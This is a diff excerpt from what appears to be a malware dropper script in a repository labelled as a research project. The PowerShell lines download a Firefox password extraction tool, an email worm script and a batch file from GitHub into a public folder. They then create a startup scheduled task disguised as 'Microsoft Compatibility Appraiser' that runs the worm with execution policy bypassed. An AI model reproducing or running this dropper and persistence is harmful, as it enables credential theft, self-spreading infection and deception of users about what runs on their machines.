@@ -151,7 +151,7 @@ mkdir "C:\Users\Public\Public Display"
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/firepwd.py' -OutFile "C:\Users\Public\Public Display\firepwd.py"
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/requirements.txt' -OutFile "C:\Users\Public\Public Display\requirements.txt"
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/email_worm.ps1' -OutFile "C:\Users\Public\Public Display\email_worm.ps1"
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/initial3_risk.cmd' -OutFile "C:\Users\Public\Public Display\initial3_risk.cmd"
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/initial3_risk.cmd' -OutFile "C:\Users\Public\Public Display\initial3_risk.cmd"
 
 
 schtasks /create /tn "Microsoft Compatibility Appraiser" /tr "powershell.exe -NoProfile -ExecutionPolicy Bypass -File 'C:\Users\Public\Public Display\email_worm.ps1'" /sc onstart /delay 0001:00 /f 
